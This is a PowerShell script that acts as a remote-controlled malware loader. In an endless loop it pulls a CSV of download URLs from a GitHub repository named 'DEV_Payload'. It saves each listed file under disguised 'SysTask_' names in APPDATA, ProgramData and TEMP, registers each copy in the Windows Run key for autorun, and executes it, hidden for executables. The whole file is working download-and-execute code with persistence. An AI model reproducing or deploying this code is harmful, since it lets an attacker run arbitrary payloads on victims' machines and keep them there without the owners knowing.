# ================================================
# UNIVERSAL WATCHER - CSV Download, Multi-Copy, Autorun, Loop
# ================================================

Add-Type -AssemblyName PresentationFramework

# CSV file URL
$CsvUrl = "https://raw.githubusercontent.com/Umair13303/DEV_Payload/refs/heads/main/GitHub_Script/Excel/Installer_Path.csv?nocache=$([guid]::NewGuid())"

# Paths to save multiple hidden copies
$BasePaths = @(
    "$env:APPDATA",
    "$env:ProgramData",
    "$env:TEMP"
)

# Registry path for autorun entries
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

while ($true) {
    try {
        [System.Windows.MessageBox]::Show("Downloading installer list...", "Dynamic Watcher")
        Write-Host "Fetching $CsvUrl"

        # Download and parse CSV
        $csvContent = Invoke-WebRequest -Uri $CsvUrl -UseBasicParsing
        $rows = $csvContent.Content | ConvertFrom-Csv

        foreach ($row in $rows) {
            $id = $row.Id
            $url = $row.'Executor Path'
            $type = $row.'Executor Type'
            $status = $row.Status.Trim().ToUpper()

            if ($status -eq "TRUE") {
                $fileName = [System.IO.Path]::GetFileName($url)
                $extension = [System.IO.Path]::GetExtension($fileName)

                foreach ($basePath in $BasePaths) {
                    $guidName = "SysTask_" + [guid]::NewGuid().ToString() + $extension
                    $targetPath = Join-Path $basePath $guidName

                    try {
                        # Download file to unique hidden path
                        Invoke-WebRequest -Uri $url -OutFile $targetPath -UseBasicParsing
                        Write-Host "Saved to $targetPath"

                        # Register autorun
                        $regKeyName = "Watcher_" + ([guid]::NewGuid().ToString("N").Substring(0, 8))
                        $runCmd = if ($extension -eq ".bat") {
                            "`"$env:ComSpec`" /c `"$targetPath`""
                        } elseif ($extension -eq ".exe") {
                            "`"$targetPath`""
                        } else {
                            $null
                        }

                        if ($runCmd) {
                            New-ItemProperty -Path $RegPath -Name $regKeyName -Value $runCmd -PropertyType String -Force | Out-Null
                            Write-Host "Registered autorun: $regKeyName"
                        }

                        # Execute the file
                        switch ($extension.ToLower()) {
                            ".bat" {
                            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$targetPath`"" -WindowStyle Normal
                            }

                            ".exe" {
                                Start-Process -FilePath $targetPath -WindowStyle Hidden
                            }
                            default {
                                [System.Windows.MessageBox]::Show("Unknown executor type: $type", "Dynamic Watcher")
                            }
                        }
                    } catch {
                        Write-Host "Failed to process $url: $($_.Exception.Message)"
                    }
                }
            }
        }
    } catch {
        [System.Windows.MessageBox]::Show("ERROR: $($_.Exception.Message)", "Dynamic Watcher")
    }

    # Wait 10 seconds before next round
    Start-Sleep -Seconds 10
}
